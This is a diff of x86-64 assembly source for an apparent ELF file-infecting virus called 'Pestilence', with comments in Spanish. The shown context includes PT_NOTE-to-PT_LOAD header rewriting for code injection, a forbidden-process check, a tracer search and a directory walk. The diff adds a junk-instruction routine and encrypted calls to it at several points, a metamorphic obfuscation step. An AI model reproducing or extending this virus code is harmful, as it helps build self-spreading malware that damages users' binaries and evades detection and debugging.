@@ -72,6 +72,7 @@ section .text
     __F_strlen__end:
 
     __F_mod_pt_note:
+        ; Pestilence.note_phdr_ptr es una dirección de memoria que apunta a un puntero
         lea rax, VAR(Pestilence.note_phdr_ptr)
         mov rax, [rax]
         mov [rax], dword 0x01                           ; p_type = PT_LOAD
@@ -103,6 +104,39 @@ section .text
         test rax, rax
         ret
     __F_ftruncate__end:
+
+    __F_crazy:
+        inc rax
+        dec rax
+        nop
+        inc rbx
+        dec rbx
+        inc rdx
+        inc rdx
+        dec rdx
+        dec rdx
+        nop
+        ; ejemplos
+        cmp rbx, rbx
+        jne __F_crazy
+        mov rax, rax
+        xchg rax, rax
+        nop word [rax+rax]
+        nop dword [rax+rax]
+        lea rax, [rax]
+        add rax, 0
+        sub rax, 0
+        or  rax, 0
+        and rax, -1
+
+        not rax
+        not rax
+
+        cmp rbx, rsi
+        
+        ret
+    __F_crazy__end:
+
 ; ----------------------------------------------------------------------------------------------------------------------
 
     _init:
@@ -223,6 +257,7 @@ section .text
 
         lea rdi, [forbidden_prog + 3]
         ; apuntamos con rsi al ultimo caracter de la cadena devuelta por readlink
+        CALL_ENCRYPT(crazy)
         add rsi, rax
         dec rsi
         mov rcx, 4
@@ -291,6 +326,8 @@ section .text
         mov rdx, 0xb
         sub rdx, rcx
         add rbx, rdx
+        CALL_ENCRYPT(crazy)
+
 
         jmp .search_trace
 
@@ -355,7 +392,7 @@ section .text
         ; shift offset from the start of the dirent struct array
         lea rdi, VAR(Pestilence.dirent_buffer)
         add rdi, r12
-
+        CALL_ENCRYPT(crazy)
         ; add lenght of directory entry to offset
         movzx ecx, word [rdi + dirent.d_len]
         add r12, rcx
